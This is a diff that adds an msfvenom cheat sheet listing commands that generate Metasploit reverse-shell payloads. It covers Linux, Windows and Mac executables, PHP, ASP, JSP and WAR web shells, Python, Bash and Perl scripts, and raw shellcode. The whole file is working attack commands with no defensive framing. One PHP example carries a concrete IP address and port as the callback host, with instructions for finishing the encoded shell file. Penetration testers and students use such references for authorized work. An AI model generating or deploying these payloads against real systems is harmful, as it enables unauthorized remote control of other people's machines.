@@ -1,0 +1,48 @@
+METASPLOIT PAYLOAD
+1. LIST AVAILABLE PAYLOADS
+$ msfvenom -l
+
+2. BINARIES PAYLOADS
+2.1 Linux
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f elf > shell.elf
+
+2.2 Windows
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f exe > shell.exe
+
+2.3 Mac
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f macho > shell.macho
+
+3. WEB PAYLOADS
+3.1 PHP
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=52.15.194.28 LPORT=12663 -e php/base64 R > shell.php
+Since the file has been encoded using base64, do not forget to open it using your favorite text editor and add “<?php” at the top and “?>” at the end.
+
+3.2 ASP
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f asp > shell.asp
+
+3.3 JSP
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f raw > shell.jsp
+
+3.4 WAR
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f war > shell.war
+
+4. SCRIPTING PAYLOADS
+4.1 Python
+$ msfvenom -p cmd/unix/reverse_python LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f raw > shell.py
+
+4.2 Bash
+$ msfvenom -p cmd/unix/reverse_bash LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f raw > shell.sh
+
+4.3 Perl
+$ msfvenom -p cmd/unix/reverse_perl LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f raw > shell.pl
+
+5. SHELLCODE PAYLOADS
+For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
+5.1 Linux Based Shellcode
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f "LANGUAGE"
+
+5.2 Windows Based Shellcode
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f "LANGUAGE"
+
+5.3 Mac Based Shellcode
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f "LANGUAGE"
